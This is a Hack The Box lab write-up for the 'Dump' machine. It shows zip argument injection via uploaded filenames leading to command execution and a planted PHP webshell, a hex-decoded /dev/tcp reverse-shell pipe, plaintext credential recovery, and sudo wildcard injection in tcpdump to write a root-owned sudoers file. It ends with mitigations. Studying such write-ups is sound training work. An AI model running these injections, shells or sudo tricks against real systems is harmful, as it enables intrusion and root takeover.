# Dump — Hack The Box, Hard, Linux

**TL;DR:** A packet-capture web app ("How do my packets look like?") zips a
user's uploaded captures with `zip <out> *` run from their upload directory —
so **filenames become `zip` arguments**. Upload files named `-T` and
`--unzip-command=<cmd>` and the download turns into arbitrary command execution
as `www-data`. The app stores login passwords in **plaintext** in a SQLite file;
one of them is the `fritz` user's, giving SSH. Root is a single, tightly
constrained `sudo NOPASSWD` for `tcpdump`, defeated by **sudo wildcard /
parameter injection**: because sudo's `*` matches across spaces, extra tcpdump
flags (`-Z root`, a second `-w`, `-r`) can be smuggled past the pattern to write
an attacker-controlled, **root-owned** file anywhere — here a `/etc/sudoers.d`
drop-in that hands `fritz` full sudo.

*Flags redacted. Machine address generalised to `10.129.x.x`. Hostname (`dump`),
service versions and the app's own source are kept — they are properties of the
box.*

---

## Recon: two ports, a PHP capture app

`22` (OpenSSH 8.4p1, Debian 11) and `80` (Apache 2.4.65, PHP). The site is a
login/register form titled *hdmpll?* — "How do my packets look like?". Register
an account (open registration) and the authenticated area offers:

- **Capture Live Traffic** → runs `tcpdump` server-side on a random port for 10s.
- **Upload Capture** → stores an uploaded file under your per-user directory.
- **Download Captures** → returns a zip of all your captures.
- **`view.php?fn=<uuid>`** → renders a capture (runs `tcpdump -r`).

`download.php` leaks its mechanism straight into an HTML comment:

```
Preparing download...
<!--
  zip warning: name not matched: *
zip error: Nothing to do! (/var/www/html/downloads/<uuid>.zip)
-->
```

That is `zip <out>.zip *` run in a directory. Whatever files sit in that
directory become the `*` glob — and a filename that begins with `-` is an
**option**, not a file.

## Foothold: zip argument injection → RCE as www-data

Confirm the glob reaches `zip` by uploading a file literally named `-h`. The next
download prints zip's usage instead of an archive — the filename was parsed as
`-h`. `zip 3.0` has exactly the primitive we want:

```
-T   test archive integrity
-TT / --unzip-command=<cmd>   use <cmd> instead of `unzip -tqq` to test
```

So upload three files into the capture directory:

- `-T` (enable the post-zip test),
- `--unzip-command=<cmd>` (the command run to "test" the archive),
- one real file so the archive is non-empty.

The command runs as `www-data`, and its stdout is reflected in the same HTML
comment — a synchronous output oracle. Two filename constraints shape the
payload: the multipart `filename=` field **truncates at `;`**, and a filename
can't contain `/`. Both are easy to work around:

- Build `/` at runtime: `$(pwd | head -c1)` — no literal slash needed.
- Or hex-encode the whole command and decode it on the box:
  `--unzip-command=echo <hex> | xxd -r -p | sh` (no `/`, no `;`, no quotes).

Note the sink is `/bin/sh` (dash), not bash, so a bash-only `>&` reverse shell
fails with "Bad fd number" — pipe a hex-decoded `bash -i >& /dev/tcp/…` into
`bash` instead. A clean, repeatable route is to have the command drop a tiny PHP
webshell into the web-served `downloads/` directory and drive that with `curl`:

```
--unzip-command=echo <hex of: echo <b64 webshell>|base64 -d>/var/www/html/downloads/sh.php>|xxd -r -p|sh #
```

The trailing `#` comments out the archive path that `zip` appends to the command.

## User: plaintext passwords in SQLite

The app's source (`www-data`-readable under `/var/www/html`) shows registration
inserting the password **verbatim**:

```php
$stmt = $pdo->prepare('INSERT OR FAIL INTO users VALUES (?,?,?);');
$stmt->execute([$username,$password,$guid]);
```

The store is `/var/www/database/database.sqlite3`:

```
sqlite> select * from users;
fritz|Passw0rdH4shingIsforNoobZ!|534ce8b9-...
```

`fritz` is a real login user (`/bin/bash` in `/etc/passwd`), and the password is
reused for SSH. `user.txt` is his. (`fritz` is also in group `adm`, which reads
the logs — a nice secondary source, but not needed here.)

## Root: sudo tcpdump, and why the obvious attacks fail

`www-data` has one sudo rule, and it is deliberately narrow:

```
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10
  -w/var/cache/captures/*/[0-9a-f]{8}-...-[0-9a-f]{12}
  -F/var/cache/captures/filter.[0-9a-f]{8}-...-[0-9a-f]{12}
```

`tcpdump` writing packets as root is a classic write primitive — but this rule
blocks the usual doors. `-z <cmd>` (postrotate RCE) isn't allowed. The `-w`
filename must match a **UUID**. And two facts kill the naive file-write chain:

1. **tcpdump drops privileges to the `tcpdump` user** and chowns its output, so a
   file it creates in `/etc/cron.d` (via the `*` path traversal) lands owned
   `tcpdump:tcpdump` — and cron refuses it: `WRONG FILE OWNER`. `sudoers.d`,
   `logrotate.d` etc. all check for root ownership too.
2. It **won't follow a symlink** to overwrite an existing file, and `bash`
   refuses to execute a binary/pcap-clobbered script anyway (`cannot execute
   binary file`) — only dash will parse one.

So the write primitive is real but seemingly un-consumable. The missing piece is
in how **sudo matches the command**.

### Sudo wildcard injection

sudo matches the whole command line against the pattern with `fnmatch`, and `*`
matches **any characters, including spaces**. The pattern is
`… -w/var/cache/captures/*/<uuid> -F…`. That single `*` will happily swallow
extra arguments. So this still matches the rule:

```
sudo tcpdump -c10 -w/var/cache/captures/a/ \
     -Z root -r sudoers.pcap \
     -w /etc/sudoers.d/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa \
     -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

The `*` absorbs `a/ -Z root -r sudoers.pcap -w /etc/sudoers.d`, the UUID class
matches the drop-in's name, and `-F…` closes it out. Now three injected flags do
the work:

- **`-Z root`** — write the output owned by **root**, defeating obstacle 1.
- **second `-w`** — tcpdump uses the last `-w`, so the real target is the
  `/etc/sudoers.d` file.
- **`-r sudoers.pcap`** — read a **crafted pcap** instead of live traffic, so I
  control the bytes written.

### Crafting the payload

Make a pcap whose packet payload is a sudoers rule (a couple of leading blank
lines separate it from the pcap header):

```bash
# on the attack box
tcpdump -w sudoers.pcap -c1 -i lo -A udp port 9001 &
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' | nc -u -w1 127.0.0.1 9001
```

Move it to the target, create the required `filter.<uuid>`, and fire the injected
command. sudo/visudo tolerates the pcap junk on line 1 (a syntax error it skips)
and applies the valid rule on the next line:

```
fritz$ sudo -l
/etc/sudoers.d/<uuid>:1:77: syntax error
...
User fritz may run the following commands on dump:
    (ALL : ALL) NOPASSWD: ALL
fritz$ sudo -i    →  root
```

The same primitives give other routes: `-Z fritz` to write a file **owned by
fritz** into `/etc/update-motd.d/` (then make it a script that root runs on the
next login), or `-V <file>` (read filenames from a file) to leak any root-only
file through the resulting error message — a clean arbitrary read for `root.txt`
without a shell.

## What would have stopped it

- **`download.php`**: never build a shell command from a glob of
  user-controlled filenames. Pass an explicit, validated file list, or use a zip
  library. A leading-`-` filename is an argument.
- **Passwords**: hash them (the machine's own DB literally names the anti-pattern
  — `Passw0rdH4shingIsforNoobZ!`).
- **The sudo rule**: wildcards in a sudoers command are argument injection. `*`
  matching spaces means "any extra flags allowed". Pin the arguments exactly, or
  wrap the capture in a small root helper with no user-controlled `tcpdump`
  flags at all.
